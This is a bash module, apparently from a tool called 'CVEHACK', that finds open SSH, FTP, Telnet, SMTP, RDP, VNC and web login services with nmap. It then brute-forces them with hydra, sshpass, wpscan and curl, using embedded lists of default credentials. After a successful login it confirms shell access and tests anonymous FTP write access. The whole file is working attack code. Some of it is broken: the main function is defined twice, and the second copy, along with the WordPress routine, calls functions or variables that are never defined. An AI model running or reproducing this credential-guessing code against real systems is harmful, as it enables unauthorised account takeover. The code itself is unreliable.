#!/bin/bash

# ============================================================================
# Brute Force Attack Module for CVEHACK
# ============================================================================

# Source required libraries
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../lib/colors.sh"
source "$SCRIPT_DIR/../lib/logger.sh"

# ============================================================================
# Intelligent Brute Force Function
# ============================================================================

intelligent_brute_force() {
    local target="$1"
    
    subsection_header "Intelligent Brute Force Analysis"
    log_scan_start "Intelligent Brute Force" "$target"
    
    print_warning "⚠️  Brute force attacks can trigger security measures and account lockouts!"
    print_info "Starting intelligent brute force analysis on $target..."
    
    # First, perform service discovery to identify attack vectors
    print_info "Identifying potential brute force targets..."
    
    local services_found=()
    local web_forms_found=()
    
    # Check for common services
    check_ssh_service "$target" && services_found+=("SSH")
    check_ftp_service "$target" && services_found+=("FTP")
    check_telnet_service "$target" && services_found+=("Telnet")
    check_smtp_service "$target" && services_found+=("SMTP")
    check_pop3_service "$target" && services_found+=("POP3")
    check_imap_service "$target" && services_found+=("IMAP")
    check_rdp_service "$target" && services_found+=("RDP")
    check_vnc_service "$target" && services_found+=("VNC")
    
    # Check for web-based authentication
    check_web_authentication "$target" web_forms_found
    
    # Display findings
    if [[ ${#services_found[@]} -gt 0 ]]; then
        print_success "Network services found for brute force testing:"
        for service in "${services_found[@]}"; do
            print_info "  - $service"
        done
    fi
    
    if [[ ${#web_forms_found[@]} -gt 0 ]]; then
        print_success "Web authentication forms found:"
        for form in "${web_forms_found[@]}"; do
            print_info "  - $form"
        done
    fi
    
    # Perform targeted brute force attacks based on findings
    for service in "${services_found[@]}"; do
        case "$service" in
            "SSH") perform_ssh_brute_force "$target" ;;
            "FTP") perform_ftp_brute_force "$target" ;;
            "Telnet") perform_telnet_brute_force "$target" ;;
            "SMTP") perform_smtp_brute_force "$target" ;;
            "RDP") perform_rdp_brute_force "$target" ;;
        esac
    done
    
    # Perform web-based brute force attacks
    for form in "${web_forms_found[@]}"; do
        perform_web_brute_force "$form"
    done
    
    print_success "Intelligent brute force analysis completed"
}

# ============================================================================
# Service Detection Functions
# ============================================================================

check_ssh_service() {
    local target="$1"
    
    if nmap -p 22 "$target" 2>/dev/null | grep -q "22/tcp open"; then
        print_success "SSH service detected on port 22"
        return 0
    fi
    return 1
}

check_ftp_service() {
    local target="$1"
    
    if nmap -p 21 "$target" 2>/dev/null | grep -q "21/tcp open"; then
        print_success "FTP service detected on port 21"
        return 0
    fi
    return 1
}

check_telnet_service() {
    local target="$1"
    
    if nmap -p 23 "$target" 2>/dev/null | grep -q "23/tcp open"; then
        print_success "Telnet service detected on port 23"
        return 0
    fi
    return 1
}

check_smtp_service() {
    local target="$1"
    
    if nmap -p 25,587,465 "$target" 2>/dev/null | grep -q "open"; then
        print_success "SMTP service detected"
        return 0
    fi
    return 1
}

check_pop3_service() {
    local target="$1"
    
    if nmap -p 110,995 "$target" 2>/dev/null | grep -q "open"; then
        print_success "POP3 service detected"
        return 0
    fi
    return 1
}

check_imap_service() {
    local target="$1"
    
    if nmap -p 143,993 "$target" 2>/dev/null | grep -q "open"; then
        print_success "IMAP service detected"
        return 0
    fi
    return 1
}

check_rdp_service() {
    local target="$1"
    
    if nmap -p 3389 "$target" 2>/dev/null | grep -q "3389/tcp open"; then
        print_success "RDP service detected on port 3389"
        return 0
    fi
    return 1
}

check_vnc_service() {
    local target="$1"
    
    if nmap -p 5900-5910 "$target" 2>/dev/null | grep -q "open"; then
        print_success "VNC service detected"
        return 0
    fi
    return 1
}

check_web_authentication() {
    local target="$1"
    local -n forms_array=$2
    
    # Ensure target has protocol
    if [[ ! "$target" =~ ^https?:// ]]; then
        if curl -s --connect-timeout 5 "https://$target" >/dev/null 2>&1; then
            target="https://$target"
        else
            target="http://$target"
        fi
    fi
    
    print_info "Checking for web authentication forms..."
    
    # Check for HTTP Basic Auth
    local auth_response=$(curl -s -o /dev/null -w "%{http_code}" "$target" 2>/dev/null)
    if [[ "$auth_response" == "401" ]]; then
        print_success "HTTP Basic Authentication detected"
        forms_array+=("$target (HTTP Basic Auth)")
    fi
    
    # Check common login paths
    local login_paths=("login" "admin" "wp-login.php" "wp-admin" "administrator" "signin" "auth" "user/login" "account/login" "portal/login")
    
    for path in "${login_paths[@]}"; do
        local login_url="$target/$path"
        local response=$(curl -s "$login_url" 2>/dev/null)
        
        if echo "$response" | grep -qi "password\|login\|signin"; then
            print_success "Login form found: $login_url"
            forms_array+=("$login_url")
        fi
    done
    
    # Check for WordPress
    if curl -s "$target" 2>/dev/null | grep -qi "wp-content\|wordpress"; then
        local wp_login="$target/wp-login.php"
        if curl -s -o /dev/null -w "%{http_code}" "$wp_login" 2>/dev/null | grep -q "200"; then
            print_success "WordPress login found: $wp_login"
            forms_array+=("$wp_login (WordPress)")
        fi
    fi
}

# ============================================================================
# Credential List Generation
# ============================================================================

create_username_list() {
    local userlist="$1"
    
    cat > "$userlist" << 'EOF'
admin
administrator
root
user
test
guest
oracle
postgres
mysql
ftp
mail
www
apache
nginx
tomcat
jenkins
git
svn
backup
service
daemon
nobody
EOF
}

create_password_list() {
    local passlist="$1"
    
    cat > "$passlist" << 'EOF'
admin
password
123456
password123
admin123
root
qwerty
letmein
welcome
monkey
dragon
master
shadow
12345678
football
baseball
1234567890
superman
trustno1
access
EOF
}

create_web_username_list() {
    local userlist="$1"
    
    cat > "$userlist" << 'EOF'
admin
administrator
webmaster
manager
operator
support
helpdesk
guest
demo
test
user
root
sa
dba
EOF
}

create_ftp_username_list() {
    local userlist="$1"
    
    cat > "$userlist" << 'EOF'
ftp
anonymous
admin
administrator
root
user
guest
test
upload
backup
ftpuser
ftpadmin
EOF
}

# ============================================================================
# Service-Specific Brute Force Functions
# ============================================================================

perform_ssh_brute_force() {
    local target="$1"
    
    subsection_header "SSH Brute Force Attack"
    print_info "Starting SSH brute force on $target:22..."
    
    if ! command -v hydra &> /dev/null; then
        print_error "Hydra not found. Performing manual SSH brute force..."
        manual_ssh_brute_force "$target"
        return
    fi
    
    # Create credential lists
    local userlist="/tmp/cvehack_ssh_users.txt"
    local passlist="/tmp/cvehack_ssh_passwords.txt"
    
    create_username_list "$userlist"
    create_password_list "$passlist"
    
    print_info "Testing SSH with common credentials..."
    print_warning "Using limited attempts to prevent account lockout"
    
    # Run hydra with conservative settings
    local hydra_output=$(timeout 300 hydra -L "$userlist" -P "$passlist" -t 2 -w 3 -f "$target" ssh 2>/dev/null)
    
    if [[ -n "$hydra_output" ]]; then
        if echo "$hydra_output" | grep -q "login:"; then
            print_error "SSH credentials found!"
            local credentials=$(echo "$hydra_output" | grep "login:" | head -1)
            print_warning "Credentials: $credentials"
            
            log_exploit_attempt "SSH Brute Force" "$target" "true" "Successful SSH brute force: $credentials"
            log_vulnerability "Weak SSH Credentials" "CRITICAL" "$target" "SSH accessible with weak credentials" "$credentials"
            
            # Test the credentials
            test_ssh_access "$target" "$credentials"
            
        else
            print_success "No SSH credentials found with common passwords"
            log_exploit_attempt "SSH Brute Force" "$target" "false" "SSH brute force unsuccessful with common credentials"
        fi
        
        # Check for account lockout indicators
        if echo "$hydra_output" | grep -qi "blocked\|banned\|locked"; then
            print_warning "Account lockout mechanism detected"
            log_vulnerability "Account Lockout" "INFO" "$target" "SSH has account lockout protection" "Lockout mechanism active"
        fi
    else
        print_error "Hydra failed to complete SSH brute force"
    fi
    
    # Cleanup
    rm -f "$userlist" "$passlist"
}

manual_ssh_brute_force() {
    local target="$1"
    
    print_info "Performing manual SSH brute force testing..."
    
    local ssh_creds=(
        "root:root"
        "admin:admin"
        "root:password"
        "admin:password"
        "root:123456"
        "admin:123456"
        "root:toor"
        "pi:raspberry"
        "ubuntu:ubuntu"
        "centos:centos"
    )
    
    for cred in "${ssh_creds[@]}"; do
        local username=$(echo "$cred" | cut -d: -f1)
        local password=$(echo "$cred" | cut -d: -f2)
        
        print_info "Testing SSH: $username:$password"
        
        # Use sshpass if available, otherwise skip
        if command -v sshpass &> /dev/null; then
            if timeout 10 sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$username@$target" "echo 'SSH_SUCCESS'" 2>/dev/null | grep -q "SSH_SUCCESS"; then
                print_error "SSH login successful!"
                print_warning "Credentials: $username:$password"
                
                log_exploit_attempt "Manual SSH Brute Force" "$target" "true" "Successful SSH login: $username:$password"
                log_vulnerability "Weak SSH Credentials" "CRITICAL" "$target" "SSH accessible with weak credentials" "$username:$password"
                return
            fi
        else
            print_warning "sshpass not available for automated SSH testing"
            break
        fi
        
        sleep 1 # Prevent rapid connection attempts
    done
    
    print_success "Manual SSH brute force completed"
}

test_ssh_access() {
    local target="$1"
    local credentials="$2"
    
    local username=$(echo "$credentials" | grep -o "login: [^[:space:]]*" | cut -d: -f2 | xargs)
    local password=$(echo "$credentials" | grep -o "password: [^[:space:]]*" | cut -d: -f2 | xargs)
    
    if [[ -n "$username" && -n "$password" ]] && command -v sshpass &> /dev/null; then
        print_info "Testing SSH access with found credentials..."
        
        local ssh_test=$(timeout 10 sshpass -p "$password" ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "$username@$target" "whoami; id; pwd" 2>/dev/null)
        
        if [[ -n "$ssh_test" ]]; then
            print_error "SSH access confirmed! System information:"
            echo "$ssh_test" | while read -r line; do
                print_warning "  $line"
            done
            
            log_vulnerability "SSH System Access" "CRITICAL" "$target" "Full SSH system access obtained" "User: $username, System info: $ssh_test"
        fi
    fi
}

perform_ftp_brute_force() {
    local target="$1"
    
    subsection_header "FTP Brute Force Attack"
    print_info "Starting FTP brute force on $target:21..."
    
    # Test anonymous FTP first
    print_info "Testing anonymous FTP access..."
    if echo "quit" | ftp -n "$target" 2>/dev/null | grep -q "230"; then
        print_error "Anonymous FTP access allowed!"
        log_vulnerability "Anonymous FTP Access" "HIGH" "$target" "FTP allows anonymous login" "Anonymous access confirmed"
        
        # Test anonymous FTP capabilities
        test_anonymous_ftp "$target"
        return
    fi
    
    if ! command -v hydra &> /dev/null; then
        print_error "Hydra not found. Performing manual FTP brute force..."
        manual_ftp_brute_force "$target"
        return
    fi
    
    # Create FTP-specific credential lists
    local userlist="/tmp/cvehack_ftp_users.txt"
    local passlist="/tmp/cvehack_ftp_passwords.txt"
    
    create_ftp_username_list "$userlist"
    create_password_list "$passlist"
    
    print_info "Testing FTP with common credentials..."
    
    # Run hydra for FTP
    local hydra_output=$(timeout 300 hydra -L "$userlist" -P "$passlist" -t 4 -f "$target" ftp 2>/dev/null)
    
    if [[ -n "$hydra_output" ]]; then
        if echo "$hydra_output" | grep -q "login:"; then
            print_error "FTP credentials found!"
            local credentials=$(echo "$hydra_output" | grep "login:" | head -1)
            print_warning "Credentials: $credentials"
            
            log_exploit_attempt "FTP Brute Force" "$target" "true" "Successful FTP brute force: $credentials"
            log_vulnerability "Weak FTP Credentials" "HIGH" "$target" "FTP accessible with weak credentials" "$credentials"
            
            # Test FTP access
            test_ftp_access "$target" "$credentials"
            
        else
            print_success "No FTP credentials found with common passwords"
            log_exploit_attempt "FTP Brute Force" "$target" "false" "FTP brute force unsuccessful"
        fi
    fi
    
    # Cleanup
    rm -f "$userlist" "$passlist"
}

test_anonymous_ftp() {
    local target="$1"
    
    print_info "Testing anonymous FTP capabilities..."
    
    # Create FTP command script
    cat > "/tmp/ftp_test.txt" << EOF
open $target
user anonymous anonymous
binary
ls
pwd
quit
EOF
    
    local ftp_output=$(ftp -n < /tmp/ftp_test.txt 2>/dev/null)
    
    if [[ -n "$ftp_output" ]]; then
        print_warning "Anonymous FTP directory listing:"
        echo "$ftp_output" | grep -E "^[d-]" | head -10 | while read -r line; do
            print_info "  $line"
        done
        
        # Check for writable directories
        cat > "/tmp/ftp_write_test.txt" << EOF
open $target
user anonymous anonymous
binary
put /tmp/ftp_test.txt test_upload.txt
ls test_upload.txt
delete test_upload.txt
quit
EOF
        
        local write_test=$(ftp -n < /tmp/ftp_write_test.txt 2>/dev/null)
        if echo "$write_test" | grep -q "226.*Transfer complete"; then
            print_error "Anonymous FTP write access confirmed!"
            log_vulnerability "Anonymous FTP Write Access" "CRITICAL" "$target" "Anonymous FTP allows file uploads" "Write access confirmed"
        fi
    fi
    
    rm -f /tmp/ftp_test.txt /tmp/ftp_write_test.txt
}

manual_ftp_brute_force() {
    local target="$1"
    
    print_info "Performing manual FTP brute force..."
    
    local ftp_creds=(
        "ftp:ftp"
        "admin:admin"
        "root:root"
        "user:user"
        "test:test"
        "guest:guest"
        "ftpuser:ftpuser"
        "upload:upload"
    )
    
    for cred in "${ftp_creds[@]}"; do
        local username=$(echo "$cred" | cut -d: -f1)
        local password=$(echo "$cred" | cut -d: -f2)
        
        print_info "Testing FTP: $username:$password"
        
        # Create FTP test script
        cat > "/tmp/ftp_login_test.txt" << EOF
open $target
user $username $password
pwd
quit
EOF
        
        local ftp_result=$(timeout 10 ftp -n < /tmp/ftp_login_test.txt 2>/dev/null)
        
        if echo "$ftp_result" | grep -q "230.*logged in"; then
            print_error "FTP login successful!"
            print_warning "Credentials: $username:$password"
            
            log_exploit_attempt "Manual FTP Brute Force" "$target" "true" "Successful FTP login: $username:$password"
            log_vulnerability "Weak FTP Credentials" "HIGH" "$target" "FTP accessible with weak credentials" "$username:$password"
            
            rm -f /tmp/ftp_login_test.txt
            return
        fi
        
        sleep 1
    done
    
    rm -f /tmp/ftp_login_test.txt
    print_success "Manual FTP brute force completed"
}

test_ftp_access() {
    local target="$1"
    local credentials="$2"
    
    local username=$(echo "$credentials" | grep -o "login: [^[:space:]]*" | cut -d: -f2 | xargs)
    local password=$(echo "$credentials" | grep -o "password: [^[:space:]]*" | cut -d: -f2 | xargs)
    
    if [[ -n "$username" && -n "$password" ]]; then
        print_info "Testing FTP access with found credentials..."
        
        cat > "/tmp/ftp_access_test.txt" << EOF
open $target
user $username $password
binary
ls
pwd
quit
EOF
        
        local ftp_test=$(ftp -n < /tmp/ftp_access_test.txt 2>/dev/null)
        
        if [[ -n "$ftp_test" ]]; then
            print_error "FTP access confirmed! Directory listing:"
            echo "$ftp_test" | grep -E "^[d-]" | head -5 | while read -r line; do
                print_warning "  $line"
            done
        fi
        
        rm -f /tmp/ftp_access_test.txt
    fi
}

perform_telnet_brute_force() {
    local target="$1"
    
    subsection_header "Telnet Brute Force Attack"
    print_info "Starting Telnet brute force on $target:23..."
    
    if ! command -v hydra &> /dev/null; then
        print_warning "Hydra not found. Telnet brute force requires hydra."
        return
    fi
    
    # Create credential lists
    local userlist="/tmp/cvehack_telnet_users.txt"
    local passlist="/tmp/cvehack_telnet_passwords.txt"
    
    create_username_list "$userlist"
    create_password_list "$passlist"
    
    print_info "Testing Telnet with common credentials..."
    print_warning "Telnet transmits credentials in plaintext!"
    
    # Run hydra for Telnet
    local hydra_output=$(timeout 300 hydra -L "$userlist" -P "$passlist" -t 2 -f "$target" telnet 2>/dev/null)
    
    if [[ -n "$hydra_output" ]]; then
        if echo "$hydra_output" | grep -q "login:"; then
            print_error "Telnet credentials found!"
            local credentials=$(echo "$hydra_output" | grep "login:" | head -1)
            print_warning "Credentials: $credentials"
            
            log_exploit_attempt "Telnet Brute Force" "$target" "true" "Successful Telnet brute force: $credentials"
            log_vulnerability "Weak Telnet Credentials" "CRITICAL" "$target" "Telnet accessible with weak credentials (plaintext protocol)" "$credentials"
            
        else
            print_success "No Telnet credentials found with common passwords"
            log_exploit_attempt "Telnet Brute Force" "$target" "false" "Telnet brute force unsuccessful"
        fi
    fi
    
    # Cleanup
    rm -f "$userlist" "$passlist"
}

perform_smtp_brute_force() {
    local target="$1"
    
    subsection_header "SMTP Brute Force Attack"
    print_info "Starting SMTP brute force on $target..."
    
    if ! command -v hydra &> /dev/null; then
        print_warning "Hydra not found. SMTP brute force requires hydra."
        return
    fi
    
    # Determine SMTP port
    local smtp_port=""
    if nmap -p 25 "$target" 2>/dev/null | grep -q "25/tcp open"; then
        smtp_port="25"
    elif nmap -p 587 "$target" 2>/dev/null | grep -q "587/tcp open"; then
        smtp_port="587"
    elif nmap -p 465 "$target" 2>/dev/null | grep -q "465/tcp open"; then
        smtp_port="465"
    else
        print_error "No SMTP ports found open"
        return
    fi
    
    print_success "SMTP service found on port $smtp_port"
    
    # Create email-specific credential lists
    local userlist="/tmp/cvehack_smtp_users.txt"
    local passlist="/tmp/cvehack_smtp_passwords.txt"
    
    cat > "$userlist" << 'EOF'
admin
administrator
postmaster
mail
email
smtp
webmaster
support
info
contact
noreply
test
user
EOF
    
    create_password_list "$passlist"
    
    print_info "Testing SMTP authentication..."
    
    # Run hydra for SMTP
    local hydra_output=$(timeout 300 hydra -L "$userlist" -P "$passlist" -t 2 -f "$target" -s "$smtp_port" smtp 2>/dev/null)
    
    if [[ -n "$hydra_output" ]]; then
        if echo "$hydra_output" | grep -q "login:"; then
            print_error "SMTP credentials found!"
            local credentials=$(echo "$hydra_output" | grep "login:" | head -1)
            print_warning "Credentials: $credentials"
            
            log_exploit_attempt "SMTP Brute Force" "$target" "true" "Successful SMTP brute force: $credentials"
            log_vulnerability "Weak SMTP Credentials" "HIGH" "$target" "SMTP accessible with weak credentials" "$credentials"
            
        else
            print_success "No SMTP credentials found with common passwords"
            log_exploit_attempt "SMTP Brute Force" "$target" "false" "SMTP brute force unsuccessful"
        fi
    fi
    
    # Cleanup
    rm -f "$userlist" "$passlist"
}

perform_rdp_brute_force() {
    local target="$1"
    
    subsection_header "RDP Brute Force Attack"
    print_info "Starting RDP brute force on $target:3389..."
    
    if ! command -v hydra &> /dev/null; then
        print_warning "Hydra not found. RDP brute force requires hydra."
        return
    fi
    
    # Create Windows-specific credential lists
    local userlist="/tmp/cvehack_rdp_users.txt"
    local passlist="/tmp/cvehack_rdp_passwords.txt"
    
    cat > "$userlist" << 'EOF'
Administrator
admin
Guest
user
test
backup
service
support
operator
manager
EOF
    
    cat > "$passlist" << 'EOF'
password
Password1
admin
123456
password123
Admin123
P@ssw0rd
Password!
welcome
qwerty
EOF
    
    print_info "Testing RDP with common Windows credentials..."
    print_warning "RDP brute force may trigger account lockout policies"
    
    # Run hydra for RDP
    local hydra_output=$(timeout 300 hydra -L "$userlist" -P "$passlist" -t 1 -w 5 -f "$target" rdp 2>/dev/null)
    
    if [[ -n "$hydra_output" ]]; then
        if echo "$hydra_output" | grep -q "login:"; then
            print_error "RDP credentials found!"
            local credentials=$(echo "$hydra_output" | grep "login:" | head -1)
            print_warning "Credentials: $credentials"
            
            log_exploit_attempt "RDP Brute Force" "$target" "true" "Successful RDP brute force: $credentials"
            log_vulnerability "Weak RDP Credentials" "CRITICAL" "$target" "RDP accessible with weak credentials" "$credentials"
            
        else
            print_success "No RDP credentials found with common passwords"
            log_exploit_attempt "RDP Brute Force" "$target" "false" "RDP brute force unsuccessful"
        fi
        
        # Check for account lockout
        if echo "$hydra_output" | grep -qi "account.*locked\|too many.*attempts"; then
            print_warning "Account lockout detected on RDP service"
            log_vulnerability "Account Lockout" "INFO" "$target" "RDP has account lockout protection" "Lockout mechanism detected"
        fi
    fi
    
    # Cleanup
    rm -f "$userlist" "$passlist"
}

# ============================================================================
# Web-Based Brute Force Functions
# ============================================================================

perform_web_brute_force() {
    local form_url="$1"
    
    subsection_header "Web Form Brute Force Attack"
    print_info "Starting web form brute force on $form_url..."
    
    # Determine the type of web form
    if echo "$form_url" | grep -qi "wordpress"; then
        perform_wordpress_brute_force "$form_url"
    elif echo "$form_url" | grep -qi "basic.*auth"; then
        perform_http_basic_auth_brute_force "$form_url"
    else
        perform_generic_web_brute_force "$form_url"
    fi
}

perform_wordpress_brute_force() {
    local wp_url="$1"
    
    print_info "Starting WordPress-specific brute force..."
    
    # Extract base URL
    local base_url=$(echo "$wp_url" | sed 's|/wp-login.php.*||')
    
    if command -v wpscan &> /dev/null; then
        print_info "Using WPScan for WordPress brute force..."
        
        # Create WordPress password list
        local wp_passlist="/tmp/cvehack_wp_passwords.txt"
        cat > "$wp_passlist" << 'EOF'
admin
password
123456
wordpress
admin123
password123
qwerty
letmein
welcome
monkey
dragon
master
EOF
        
        # Run WPScan brute force
        local wpscan_output=$(timeout 300 wpscan --url "$base_url" --usernames admin,administrator --passwords "$wp_passlist" --max-threads 1 2>/dev/null)
        
        if [[ -n "$wpscan_output" ]]; then
            if echo "$wpscan_output" | grep -q "Valid Combinations Found"; then
                print_error "WordPress credentials found!"
                local wp_creds=$(echo "$wpscan_output" | grep -A 10 "Valid Combinations Found")
                print_warning "WordPress credentials:"
                echo "$wp_creds" | grep -E "Username|Password" | while read -r line; do
                    print_info "  $line"
                done
                
                log_exploit_attempt "WordPress Brute Force" "$base_url" "true" "Successful WordPress brute force"
                log_vulnerability "Weak WordPress Credentials" "HIGH" "$base_url" "WordPress accessible with weak credentials" "$wp_creds"
                
            else
                print_success "No WordPress credentials found with common passwords"
                log_exploit_attempt "WordPress Brute Force" "$base_url" "false" "WordPress brute force unsuccessful"
            fi
        fi
        
        rm -f "$wp_passlist"
        
    else
        print_warning "WPScan not available. Performing manual WordPress brute force..."
        manual_wordpress_brute_force "$wp_url"
    fi
}

manual_wordpress_brute_force() {
    local wp_login="$1"
    
    print_info "Performing manual WordPress brute force..."
    
    local wp_creds=(
        "admin:admin"
        "admin:password"
        "admin:123456"
        "administrator:admin"
        "admin:wordpress"
        "admin:qwerty"
        "root:root"
        "test:test"
    )
    
    for cred in "${wp_creds[@]}"; do
        local username=$(echo "$cred" | cut -d: -f1)
        local password=$(echo "$cred" | cut -d: -f2)
        
        print_info "Testing WordPress credentials: $username:$password"
        
        if command -v wpscan &> /dev/null; then
            local wp_result=$(wpscan --url "$target" --username "$username" --password "$password" --no-banner 2>/dev/null)
            
            if echo "$wp_result" | grep -q "Valid Combination Found"; then
                print_success "WordPress credentials found: $username:$password"
                log_vulnerability "WordPress Weak Credentials" "HIGH" "$target" "Valid credentials found: $username:$password" "$wp_result"
                found_creds+=("WordPress:$username:$password")
            fi
        else
            # Manual WordPress login attempt
            local login_url="$target/wp-login.php"
            local login_data="log=$username&pwd=$password&wp-submit=Log+In"
            local login_response=$(curl -s -d "$login_data" -c /tmp/wp_cookies.txt "$login_url" 2>/dev/null)
            
            if ! echo "$login_response" | grep -q "ERROR"; then
                print_success "WordPress credentials found: $username:$password"
                log_vulnerability "WordPress Weak Credentials" "HIGH" "$target" "Valid credentials found: $username:$password" "Manual login test successful"
                found_creds+=("WordPress:$username:$password")
            fi
        fi
    done
    
    # Save results
    local wp_data="WordPress Brute Force Results for $target
Generated: $(date)

Found Credentials:
$(printf '%s\n' "${found_creds[@]}")
"
    
    save_scan_data "wordpress_bruteforce" "$target" "$wp_data"
    log_scan_result "WordPress Brute Force" "$target" "$wp_data"
    
    print_success "WordPress brute force completed"
}

# ============================================================================
# Intelligent Brute Force
# ============================================================================

intelligent_brute_force() {
    local target="$1"
    
    section_header "Intelligent Brute Force Attack"
    log_scan_start "Intelligent Brute Force" "$target"
    
    print_info "Starting intelligent brute force on $target..."
    print_warning "This will attempt multiple attack vectors..."
    
    # Perform all brute force attacks
    ssh_brute_force "$target"
    echo ""
    
    ftp_brute_force "$target"
    echo ""
    
    http_basic_auth_brute_force "$target"
    echo ""
    
    web_form_brute_force "$target"
    echo ""
    
    wordpress_brute_force "$target"
    
    print_success "Intelligent brute force completed"
    log_scan_result "Intelligent Brute Force" "$target" "All brute force attacks completed"
}
